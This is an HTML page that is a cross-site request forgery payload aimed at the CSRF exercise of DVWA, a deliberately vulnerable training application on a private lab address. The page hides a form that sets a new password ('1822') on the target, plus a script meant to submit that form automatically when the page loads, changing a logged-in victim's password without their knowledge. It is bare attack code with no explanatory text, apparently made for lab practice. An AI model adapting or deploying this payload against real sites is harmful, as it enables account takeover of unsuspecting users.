<html>
<body>
	<div>
<form action="http://192.168.182.131/dvwa2/vulnerabilities/csrf/" method="GET">
			New password:<br>
			<input autocomplete="off" name="password_new" value="1822" type="password"><br>
			Confirm new password:<br>
			<input autocomplete="off" name="password_conf" value="1822" type="password"><br>
			<br>
			<input id="tikla" value="Change" name="Change" type="submit">

		</form>

		<script>
			document.getElementById('tikla').submit();
		</script>
	</div>
</body>
</html>
